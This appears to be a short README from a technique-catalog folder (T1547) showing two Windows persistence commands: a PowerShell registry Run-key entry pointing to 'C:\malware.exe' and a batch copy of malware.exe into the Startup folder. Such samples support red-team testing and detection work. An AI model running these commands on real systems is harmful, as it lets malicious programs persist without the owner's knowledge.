# Code Samples: T1547 Registry Run Keys/Startup Folder

This folder contains code examples for adding registry run key entries and startup folder persistence on Windows.

## Example: Add Run Key with PowerShell
```powershell
Set-ItemProperty -Path 'HKCU:\Software\Microsoft\Windows\CurrentVersion\Run' -Name 'MaliciousApp' -Value 'C:\malware.exe'
```

## Example: Add to Startup Folder with Batch
```batch
copy malware.exe "%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup\"
```
